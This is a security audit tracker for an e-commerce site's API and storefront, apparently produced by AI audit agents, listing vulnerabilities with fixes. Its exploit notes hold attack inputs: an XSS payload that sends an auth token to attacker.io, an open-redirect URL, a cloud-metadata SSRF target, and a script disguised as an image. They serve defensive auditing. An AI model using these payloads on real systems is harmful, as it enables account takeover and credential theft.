# Afrizonemart 2.0 — Security Audit Tracker

> Comprehensive security audit completed **2026-05-07** by six parallel
> deep-scan agents (auth, authz/IDOR, webhooks/payments, input
> validation/injection, uploads/secrets/logs, frontend), plus npm
> advisory scans on both repositories.
>
> **Scope:** `afrizonemart-api/` (Express/Prisma) +
> `afrizonemart-v2/` (Next.js storefront) — every code file in both
> repos.
>
> **Status legend:** `[ ]` not started · `[~]` in progress · `[x]` fixed · `[!]` won't fix (with reason) · `[?]` needs verification
>
> Cross-references: paths are repo-relative
> (`afrizonemart-api/...` or `afrizonemart-v2/...`). Numbered IDs
> (C1, H1, M1, L1, N1) are stable — never re-number, only mark done.

---

## Headline

**3 critical, 11 high, 12 medium, 5 low, 11 npm advisories** (10 in
`next` itself). Mostly mainstream e-commerce defaults that didn't
get hardened. None of the criticals require massive rewrites — they
are surgical fixes.

**Nothing in this audit suggests active compromise** — every finding
is a vulnerability that exists in the code, not evidence of an
ongoing attack.

**One false positive corrected** (see N1 below): `prisma.$executeRaw`
with a tagged template at `shelves/service.ts:445` is **safe** —
Prisma's tagged-template form is parameterized; only
`$executeRawUnsafe` is unsafe.

---

## Recommended fix order

If you have one focused day, ship in this order — each step is
≤ 1 hour and they're independent:

1. C1 + C2 — DOMPurify + auth-store partialize (2 h, single PR)
2. C3 — `returnUrl` validator (15 min)
3. H2 — `crypto.timingSafeEqual` in both gateways (15 min)
4. H6 — pin JWT algorithm + add iss/aud (30 min)
5. H10 — Helmet CSP/HSTS/frameGuard (45 min, watch for iframe breakage)
6. H4 — webhook amount/currency check (45 min)
7. H1 — `requireCapability` middleware (2 h)

That sequence closes the worst account-takeover and payment-fraud
paths in a day.

H3 (replay protection), H8 (magic-byte sniff), H9 (credential
encryption) each warrant their own focused PR after.

**H11 (Next.js upgrade)** is the biggest item — schedule a separate
window because Next 16 has breaking changes in caching, middleware,
and route-config. The current advisories are mostly DoS-class, not
RCE-class — important but not "today."

---

# 🔴 CRITICAL (immediate)

## [x] C1 — XSS via `dangerouslySetInnerHTML` with no sanitizer

**Fixed 2026-05-07**: installed `isomorphic-dompurify`, wrapped all 4
sites with `DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })`.
JSON-LD sites use `JSON.stringify` which is auto-escaped (confirmed
safe; not in scope).

**Severity:** Critical

**What:** The frontend renders user-supplied HTML in three hot
places with **no DOMPurify or any other sanitizer in the dep tree**.

**Where:**
- `afrizonemart-v2/src/app/(shop)/blog/[slug]/page.tsx:165` — blog post body (admin-authored)
- `afrizonemart-v2/src/components/cms/PageBlocks.tsx:152` — CMS rich-text block
- `afrizonemart-v2/src/components/product/DynamicFieldDisplay.tsx:37` — RICHTEXT custom field on product pages
- `afrizonemart-v2/src/components/admin/BlogPostForm.tsx:158` — admin preview

**Exploit:** Any admin or STAFF with `blog.write` /
`cms-pages.write` / `products.write` posts a rich-text block
containing
`<img src=x onerror="fetch('https://attacker.io/?t='+localStorage.getItem('azm-auth'))">`.
Every visitor to that blog post / CMS page / product silently leaks
their `azm-auth` localStorage entry — which (see C2) contains their
access token. Compromised admin = full storefront customer
takeover.

**Fix:** `npm i isomorphic-dompurify`, then wrap every `__html`:
```tsx
import DOMPurify from 'isomorphic-dompurify';
dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
}}
```

**JSON-LD blocks (`JSON.stringify(schema)`)**: SAFE. JSON.stringify
auto-escapes; no fix needed.

---

## [ ] C2 — Access token persisted in `localStorage`

**Severity:** Critical

**What:** `afrizonemart-v2/src/stores/authStore.ts:55-62` persists
the entire auth state — including `accessToken` — under the
`azm-auth` key. Refresh token is correctly httpOnly, but a
15-minute access token still lets an attacker make any authed API
call (read orders, fetch addresses, place orders).

**Exploit:** Combined with C1 it's full account takeover. Even
alone, any future XSS = direct API access for the lifetime of the
access token. The whole point of httpOnly refresh tokens is
defeated when the access token sits in JS reach.

**Fix:** Configure Zustand `persist` to **partialize** so it only
persists `user` + display state. Keep `accessToken` in memory
only. On reload, call `/api/auth/refresh` once via the cookie to
mint a fresh access token. The existing 401-retry logic already
does this — partialize just makes it eager.

```ts
persist(..., {
  name: 'azm-auth',
  partialize: (s) => ({ user: s.user }), // omit accessToken
})
```

---

## [ ] C3 — Open redirect on `/login?returnUrl=//attacker.com`

**Severity:** Critical

**What:** `afrizonemart-v2/src/app/(auth)/login/page.tsx:28-30`
validates with `returnUrl.startsWith('/')` — but `//attacker.com`
also starts with `/`. Browsers treat `//host` as protocol-relative.

**Exploit:**
`https://afrizonemart.com/login?returnUrl=//attacker.com/login-clone`
— user logs in, lands on the cloned phishing page that re-prompts
them, harvesting credentials. Phishable via shortened links sent
in email/SMS.

**Fix:**
```ts
const safe = returnUrl
  && returnUrl.startsWith('/')
  && !returnUrl.startsWith('//')
  ? returnUrl
  : '/account';
```
Stricter alternative: allowlist `['/', '/account', '/cart', '/checkout/...']`.

---

# 🟠 HIGH (this week / next 2 weeks)

## [ ] H1 — STAFF role gate, but no per-capability check on admin endpoints

**Severity:** High

**What:** `afrizonemart-api/src/modules/admin/routes.ts:42` gates all
`/api/admin/*` routes with `requireRole('ADMIN','STAFF')`. The
frontend sidebar filters by `User.permissions[]` — but **no API
handler checks capabilities**.

**Exploit:** Any STAFF token can hit
`PATCH /api/admin/products/:id` and modify any product, regardless
of whether they were granted `products.write`. Same for coupons,
categories, blog, etc. The frontend hides the buttons; a direct
API call walks right through.

**Affected routers** (mounted in
`afrizonemart-api/src/modules/admin/routes.ts:43-71`):
- `/products` — needs `products.write`
- `/brands` — `products.write`
- `/categories` — `categories.write`
- `/reviews` — `reviews.moderate`
- `/orders` — `orders.read` / `orders.write`
- `/customers` — `customers.read` / `customers.write`
- `/coupons` — `coupons.write`
- `/shipping` — `shipping.write`
- `/settings` — `settings.write`
- `/audit-log` — `audit.read`
- `/webhooks` — `webhooks.write`
- `/reports` — `reports.read`
- `/notifications` — `notifications.write`
- `/email-templates` — `email-templates.write`
- `/custom-fields` — `custom-fields.write`
- `/payment-gateways` — `payment-gateways.write`
- `/feature-flags` — `feature-flags.write`
- `/business-rules` — `business-rules.write`
- `/pages` — `cms-pages.write`
- `/blog` — `blog.write`
- `/content` — `content.write`
- `/intern` — already gated to ADMIN-only at admin.routes.ts
- `/placements` — `products.write`
- `/shelves` — `products.write`

**Fix:** Add `requireCapability(...)` middleware. Apply per
sub-router:
```ts
adminRouter.use('/products', requireCapability('products.write'), adminProductRoutes);
```
Single source of truth: pull the capability list from the same
`Capability` union the frontend uses (export shared file).

---

## [ ] H2 — Webhook signatures compared with `===` (timing leak)

**Severity:** High

**What:** Both payment gateways compare signatures with plain
string equality, which leaks timing per-character.

**Where:**
- `afrizonemart-api/src/modules/payments/gtsquad-gateway.ts:125` — `sig.toUpperCase() !== expected`
- `afrizonemart-api/src/modules/payments/flutterwave-gateway.ts:128` — `sig !== this.secretHash`

**Exploit:** With network-timing access, brute-force the
secret-hash character-by-character via response-time variance.
Practical against Flutterwave's plain shared secret; less
practical but still measurable against Squad's HMAC.

**Fix:**
```ts
import { timingSafeEqual } from 'node:crypto';
const a = Buffer.from(sig.toUpperCase());
const b = Buffer.from(expected);
if (a.length !== b.length || !timingSafeEqual(a, b)) {
  return { status: 'IGNORED', reason: 'Bad signature' };
}
```

---

## [ ] H3 — No webhook replay protection

**Severity:** High

**What:** `WebhookDelivery` (or equivalent) has no unique
constraint on `(provider, eventId)`. Re-posting a captured signed
webhook re-fires the SUCCEEDED handler. Idempotency at the
Payment level partially saves us, but two concurrent replays can
race past it.

**Where:** `afrizonemart-api/prisma/schema.prisma`
`WebhookDelivery` model — no unique index on a provider+event
identifier; `payments/service.ts:applyWebhookOutcome`
`payments/service.ts:193` — checks payment status but isn't
guaranteed atomic against duplicate inserts.

**Exploit:** Attacker captures one valid SUCCEEDED webhook (eg.
intercepting from a misconfigured webhook URL). Replays it later
to re-flip an order to PAID, or floods replays to cause DoS
through duplicate event handling.

**Fix:** Add a `WebhookEvent` table:
```prisma
model WebhookEvent {
  id        String   @id @default(cuid())
  provider  String
  eventId   String   // gateway-side unique id (or hash of gatewayRef + status)
  receivedAt DateTime @default(now())
  @@unique([provider, eventId])
}
```
INSERT first inside the transaction; treat unique-violation as
"already processed → 200".

---

## [ ] H4 — Webhook handlers don't verify amount / currency match

**Severity:** High

**What:** `payments/service.ts:applyWebhookOutcome` flips Order →
PAID without comparing the webhook's reported amount to
`Order.total`. A compromised gateway account or a misconfigured
provider could downgrade orders.

**Where:** `afrizonemart-api/src/modules/payments/service.ts:183-238`
— `init.rawPayload` and `outcome.rawPayload` carry
amount/currency but it's never validated against the Order.

**Exploit:** Attacker with gateway API access modifies a webhook
to report ₦5,000 paid when the order is ₦50,000. System flips
order to PAID without verification.

**Fix:** Read `outcome.rawPayload.amount` + `currency`, reject
when either differs from the Order. Allow ±1 minor unit for
rounding.
```ts
const claimedAmount = Number(outcome.rawPayload.amount);
if (!Number.isFinite(claimedAmount)
  || Math.abs(claimedAmount - order.total) > 1
  || (outcome.rawPayload.currency ?? '').toUpperCase() !== order.currency) {
  // Log + audit; do NOT flip the order.
  return { status: 'IGNORED', reason: 'Amount/currency mismatch' };
}
```

---

## [ ] H5 — SSRF in admin-registered webhook URLs

**Severity:** High

**What:** `afrizonemart-api/src/modules/webhooks/admin.schema.ts:11`
accepts any `z.string().url()` and the dispatcher
(`webhooks/dispatcher.ts:56-65`) POSTs without filtering.

**Exploit:** Admin (or compromised admin account) registers
`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
as a webhook URL. The dispatcher POSTs to it, leaking
Railway/cloud metadata creds in error logs / response bodies.
Same trick for internal services (e.g.,
`http://postgres.railway.internal:5432`).

**Fix:** Resolve hostname before insert; reject:
- Loopback: `127.0.0.0/8`, `::1`
- RFC1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- Link-local / metadata: `169.254.0.0/16`
- Internal DNS suffixes: `*.internal`, `*.local`

Use `dns.lookup()` + check resolved IP, not just hostname text.

---

## [ ] H6 — JWT verify without explicit `algorithms`

**Severity:** High

**What:** `afrizonemart-api/src/modules/auth/jwt.ts:40` and
`afrizonemart-api/src/middleware/auth.ts:31` call `jwt.verify(token, secret)`
without `algorithms: ['HS256']`. Old `jsonwebtoken` was famously
vulnerable to `alg: none` and HS↔RS confusion. Modern versions
guard against `none`, but pinning is best-practice and protects
against accidental key-type changes.

Also missing `iss` (issuer) and `aud` (audience) claims — JWTs
from one instance accepted by another if secret leaks across.

**Fix:**
```ts
jwt.sign(payload, env.JWT_SECRET, {
  algorithm: 'HS256',
  issuer: 'afrizonemart',
  audience: 'afrizonemart',
  expiresIn: env.JWT_EXPIRES_IN,
});
jwt.verify(token, env.JWT_SECRET, {
  algorithms: ['HS256'],
  issuer: 'afrizonemart',
  audience: 'afrizonemart',
});
```

---

## [ ] H7 — No OAuth state / nonce on Google sign-in

**Severity:** High

**What:** `afrizonemart-api/src/modules/auth/google.service.ts:48-73`
validates `aud` but no `state` (CSRF) or `nonce` (replay).
Frontend `GoogleSignInButton.tsx:61-79` doesn't issue or store
either.

**Exploit:** A captured ID token can be replayed at
`/api/auth/google` to log in as the victim. Also, no `state`
means a malicious site can trigger an OAuth callback to the
victim's session.

**Fix:** Frontend generates a random `state` + `nonce` per OAuth
attempt, stores both in `sessionStorage`, sends in the OAuth
URL. API validates `state` matches and the ID token's `nonce`
claim matches. Also verify `azp` (authorized party) ===
`GOOGLE_CLIENT_ID` per OIDC spec.

---

## [ ] H8 — Multer accepts client-declared MIME, no magic-byte sniff

**Severity:** High

**What:** `afrizonemart-api/src/modules/uploads/routes.ts:13-17`
validates by `file.mimetype` — a header the client controls.
`uploads/service.ts:12-18` has an `ALLOWED_MIME` set but uses the
same client-supplied value.

**Exploit:** Attacker uploads `<script>alert(1)</script>` with
`Content-Type: image/png`. Stored, served from R2 as
`image/png`. If the bucket lacks `X-Content-Type-Options: nosniff`
or a future code path strips it, browser sniffing turns it into
HTML → stored XSS via image URL.

**Fix:** `npm i file-type`. Sniff first 4KB of the buffer; reject
when sniffed type ≠ declared type. Force
`X-Content-Type-Options: nosniff` and the *sniffed* `ContentType`
on R2 objects (via `PutObjectCommand` `ContentType`).

---

## [ ] H9 — Payment gateway credentials stored plaintext in Postgres

**Severity:** High

**What:** `afrizonemart-api/prisma/schema.prisma:870`
`PaymentGatewayConfig.credentials` is a JSON column with no
encryption. Any DB read (backup leak, SQL injection elsewhere,
compromised backup file) yields every gateway secret in cleartext.

**Where:** `payments/admin.controller.ts:16, 84-90` — admin
controller redacts on response (good) but stores raw on the way
in (bad).

**Exploit:** Postgres dump (e.g., a developer's `.dump` file
checked into a private repo, a Railway support ticket, a stolen
backup) → attacker reads all SQUAD_SECRET_KEY, FLUTTERWAVE
credentials, etc., and impersonates the platform in payment
gateways, redirecting customer funds.

**Fix:** Application-layer AES-256-GCM with a key from
`env.SECRETS_KEY`. Encrypt on write in `adminUpdateGatewayConfig`,
decrypt on read in `buildGateway`. Migration: re-save existing
rows once after deploying the encryption code.

Long-term: vault them in a real secret manager (AWS Secrets
Manager / HashiCorp Vault) instead of Postgres.

---

## [ ] H10 — Helmet missing CSP, HSTS, frameGuard, referrerPolicy

**Severity:** High

**What:** `afrizonemart-api/src/server.ts:65` only sets
`crossOriginResourcePolicy: 'cross-origin'`. No CSP (clickjacking
+ script-injection mitigation), no HSTS, no `X-Frame-Options`,
no `Referrer-Policy`.

**Exploit:** API responses are framable (clickjacking on admin
panels), no transport-security pin, no script-source restriction.

**Fix:**
```ts
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'https://images.afrizonemart.com', 'data:'],
      frameAncestors: ["'none'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  frameguard: { action: 'deny' },
}));
```

Watch for: any iframe embeds (admin email-template preview at
`afrizonemart-v2/src/app/(admin)/admin/email-templates/[id]/page.tsx:322-327`
uses `srcDoc`, which is fine; just verify nothing breaks).

---

## [ ] H11 — npm CVEs in `next` (9 high) + `postcss` (1 moderate)

**Severity:** High (advisories), but mostly DoS-class

**What:** `next` itself has nine HIGH advisories:
- DoS via Image Optimizer remotePatterns (GHSA-9g9p-9gw9-jx7f)
- HTTP request deserialization → DoS with insecure RSCs (GHSA-h25m-26qc-wcjf)
- HTTP request smuggling in rewrites (GHSA-ggv3-7p47-pfv8)
- Unbounded next/image disk cache (GHSA-3x4c-7xq6-9pq8)
- DoS with Server Components (GHSA-q4gf-8mx6-v5v3)
- Plus 4 more

`postcss` < 8.5.10 — XSS via unescaped `</style>` in CSS Stringify
output (GHSA-qx2v-qp2m-jg93) — moderate.

API side: `express-rate-limit → ip-address` XSS in HTML-emitting
methods (moderate, low real-world impact — we don't render
ip-address strings as HTML).

**Fix:** `next@16.x` major bump. Schedule a separate window —
Next 16 has breaking changes in caching, middleware, and
route-config. Plan: run codemods, test all routes, deploy to
preview, smoke-test. Do not bundle with other security fixes.

---

# 🟡 MEDIUM (this month)

## [ ] M1 — Coupon race at order placement

**Where:** `afrizonemart-api/src/modules/coupons/evaluator.ts:48-56`
**What:** Coupons validate `maxUses` / `maxUsesPerCustomer` at
cart-apply time but no row lock at order placement. Two
near-concurrent orders can both pass validation if the coupon's
`usageCount` is at the limit.
**Fix:** `SELECT ... FOR UPDATE` on the Coupon row inside the
order-create transaction; re-validate after the lock; only
increment + commit inside the transaction.

## [ ] M2 — `apiFetchAuthed` concurrent-refresh race

**Where:** `afrizonemart-v2/src/lib/api/client.ts:49-52`
**What:** When two parallel requests both 401 simultaneously,
both call `useAuthStore.getState().refresh()` in parallel. Both
race to consume the same refresh cookie; the second may get a
stale token or write to a half-updated store.
**Fix:** Add a singleton `refreshPromise` in authStore.
Concurrent callers `await` the same promise; only the first call
hits `/api/auth/refresh`.

## [ ] M3 — Sentry not stripping headers / cookies / body fields

**Where:** `afrizonemart-api/src/infra/sentry.ts`
**What:** No `beforeSend` hook. Captured exceptions can include
Authorization headers, cookies (refresh token), and body fields
(passwords, payment hash). Frontend `sentry.client.config.ts`
also lacks PII filtering.
**Fix:**
```ts
beforeSend(event) {
  if (event.request) {
    delete event.request.headers?.authorization;
    delete event.request.headers?.cookie;
    delete event.request.cookies;
    if (event.request.data && typeof event.request.data === 'object') {
      const data = event.request.data as Record<string, unknown>;
      for (const k of ['password', 'newPassword', 'secretKey', 'secretHash']) {
        if (k in data) data[k] = '[REDACTED]';
      }
    }
  }
  return event;
},
```

## [ ] M4 — Zod `flatten().fieldErrors` returned to clients

**Where:** `afrizonemart-api/src/middleware/error-handler.ts:66`
**What:** Detailed validation errors with full field paths
expose schema structure to attackers, helping them craft valid
payloads.
**Fix:** In production return generic `{ error: 'Invalid input' }`
to the client; keep detailed `fieldErrors` in server logs only.

## [ ] M5 — Stub gateway can be picked as fallback in prod

**Where:** `afrizonemart-api/src/modules/payments/service.ts:57-78`
**What:** If all real `PaymentGatewayConfig` rows are inactive or
missing, code falls back to the stub gateway, which marks
payments as SUCCEEDED instantly. Customers could place orders
without paying.
**Fix:** In `NODE_ENV === 'production'`, throw an explicit error
when no real gateway is active. Stub becomes opt-in via a flag
like `ALLOW_STUB_GATEWAY=1`.

## [ ] M6 — No password complexity requirements

**Where:** `afrizonemart-api/src/modules/auth/auth.schema.ts:15-18`
**What:** Only `min(8)`. Users can register with `password`,
`12345678`, etc.
**Fix:** Add zxcvbn min-strength check (server + client),
require ≥ 8 chars + at least one of digit/symbol/upper.

## [ ] M7 — No per-account login lockout

**Where:** `afrizonemart-api/src/modules/auth/service.ts:111-128`
**What:** IP-only rate limiting; doesn't protect a specific
account when the attacker rotates IPs (or shares an IP with
many users — collateral lockout).
**Fix:** Soft-lock account after 5 failures in 15 minutes; email
the user. Tracked in a `LoginAttempt` table or in-memory LRU.

## [ ] M8 — Refresh-cookie path `/api/auth` is fragile

**Where:** `afrizonemart-api/src/modules/auth/controller.ts:34`
**What:** Cookie scoped to `/api/auth`. Future endpoints outside
that path won't get the cookie. Functionally fine today; the
risk is silent breakage on future refactors.
**Fix:** Widen to `/api`.

## [ ] M9 — `next.config.mjs` allows `**.r2.dev` wildcard

**Where:** `afrizonemart-v2/next.config.mjs:19`
**What:** Pattern `**.r2.dev` allows images from any Cloudflare
R2 bucket worldwide. Attacker who controls any other R2 bucket
can serve malicious content as our `<Image>` source.
**Fix:** Tighten to `images.afrizonemart.com` only. Remove
the `r2.dev` wildcard entirely once the custom domain is the
sole production URL.

## [ ] M10 — Express body limit 8MB everywhere

**Where:** `afrizonemart-api/src/server.ts:103`
**What:** `express.json({ limit: '8mb' })` applies globally.
Auth + cart need only ~1KB; only bulk-CSV upload needs 8MB.
**Fix:** Per-route limits — 64KB for auth, 1MB for cart, 8MB
only on `/api/admin/products/bulk` and similar.

## [ ] M11 — Local-dev `express.static('uploads')` serves dotfiles

**Where:** `afrizonemart-api/src/server.ts:96`
**What:** `app.use('/uploads', express.static(...))` without
options. Serves dotfiles by default (less of a risk in prod
where R2 is used, but cheap to fix).
**Fix:** `express.static(dir, { dotfiles: 'deny', index: false })`

## [ ] M12 — CORS allows any localhost port + `credentials: true` in dev

**Where:** `afrizonemart-api/src/server.ts:75`
**What:** `LOCALHOST_ANY_PORT` regex + `credentials: true`. A
malicious dev-mode page on any localhost port can make authed
cross-origin calls.
**Fix:** Dev allowlist explicit ports (3000, 3737); document the
risk.

---

# 🟢 LOW / INFORMATIONAL

## [ ] L1 — Phone OTP code entropy (6 digits) delegated to Twilio

**Where:** `afrizonemart-api/src/modules/auth/phone.service.ts:54`
**What:** 6-digit codes have ~20 bits entropy (1M combos).
Twilio Verify rate-limits OTP attempts per phone number; we
inherit that protection. Document the assumption.

## [ ] L2 — Refresh-token JTI not stored for individual revocation

**Where:** `afrizonemart-api/src/modules/auth/service.ts:82`
**What:** Each refresh token has a unique `jti` but it's not
stored. Can't revoke a specific session — only "logout
everywhere." Defer until there's a real need.

## [ ] L3 — Cart in localStorage on shared devices

**Where:** `afrizonemart-v2/src/stores/cartStore.ts:48`
**What:** Cart items survive logout. Privacy concern, not
security. Clear cart on logout via `setLogout` listener.

## [ ] L4 — Cookie parser unsigned

**Where:** `afrizonemart-api/src/server.ts:112` —
`cookieParser()` no secret
**What:** By design — refresh-token validation is hash-based
(stored in DB), not cookie-signed. Document intentional choice.

## [ ] L5 — Frontend `NEXT_PUBLIC_*` env exposure

**Where:** `afrizonemart-v2/.env.local`
**What:** Exposes `NEXT_PUBLIC_API_URL`, `NEXT_PUBLIC_SITE_URL`,
`NEXT_PUBLIC_GTM_ID`, `NEXT_PUBLIC_SENTRY_DSN`,
`NEXT_PUBLIC_POSTHOG_KEY`. All intentionally public; no secrets
in bundle. No fix needed.

---

# ✅ Patterns reviewed and confirmed safe

These were verified during the audit and are correctly implemented
— listing for completeness so they're not re-investigated:

- **Bcrypt cost factor 12** — strong (`auth/service.ts:26`).
- **Password reset tokens hashed in DB + single-use + expiry** — correct (`auth/service.ts:196-237`).
- **Refresh tokens hashed before storage** — correct (`auth/service.ts:84-85`).
- **Rate-limiting on auth endpoints (login, register, forgot-password)** — present (`middleware/rate-limit.ts:26-49`).
- **Forgot-password anti-enumeration (always 204)** — correct (`auth/service.ts:177-207`).
- **Logout revokes all refresh sessions** — correct (`auth/service.ts:162-164`).
- **Refresh-token cookie httpOnly + secure(prod) + sameSite** — correct (`auth/controller.ts:29-39`).
- **Cart sync gates by `userId` from token** — no IDOR (`cart/controller.ts:13-53`).
- **Intern queue scoped to `assignedInternId`** — correct (`intern/service.ts:59-117, 156-207`).
- **Customer-update mass-assignment** — schema only allows `name` + `role`; self-demotion blocked (`customers/admin.schema.ts:14-18`, `admin.service.ts:151-157`).
- **Staff-management ADMIN-only inner gate** — correct (`admin/routes.ts:53`).
- **Upload key construction** — `${folder}/${cuid}.${ext}` from allowlist; safe from path traversal (`uploads/service.ts:93-104`).
- **JSON-LD `dangerouslySetInnerHTML`** — `JSON.stringify()` auto-escapes; safe pattern.
- **Request logger redacts headers/bodies** — only logs method/path/status/duration/UA (`middleware/request-logger.ts:24-34`).
- **Health-check `prisma.$queryRaw\`SELECT 1\``** — no user input; safe.
- **Mass assignment via cart** — server re-fetches product price; client value not trusted.
- **Frontend `RequireAdmin`** — UX gate only; API enforces independently. Correct defense-in-depth.

---

# ❌ False positives

## N1 — `prisma.$executeRaw` tagged template (NOT SQL injection)

**Reported by:** Input/injection auditor

**Claim:** SQL injection in
`afrizonemart-api/src/modules/shelves/service.ts:445`:
```ts
await prisma.$executeRaw`UPDATE "Shelf" SET "updatedAt" = "createdAt" WHERE "key" = ${def.key}`;
```

**Verdict:** False positive. `prisma.$executeRaw` with a
**tagged-template** literal is parameterized — Prisma binds
template substitutions as positional parameters, not string
interpolation. The unsafe variant is `$executeRawUnsafe()`,
which we don't use anywhere in the codebase.

**No fix needed.** Documented here so the line isn't
re-flagged in future audits.

---

# Audit metadata

- **Date completed:** 2026-05-07
- **Audit method:** six parallel Explore agents (Auth + session,
  Authz/IDOR, Webhooks/Payments, Input/injection, Uploads/secrets/
  logs, Frontend) + npm audit on both repos. Each agent given a
  ~700-word budget, with file:line evidence required for every
  claim.
- **Coverage:** every TS/TSX file in both repos. Schema scanned
  for IDOR + mass-assignment vectors.
- **Total findings:** 3 critical, 11 high, 12 medium, 5 low,
  1 false positive flagged for the record. Plus 11 npm advisories.

When fixing: link the PR / commit hash on the line of each
finding when marking `[x]`. That keeps this file as the single
source of truth on the security posture going forward.
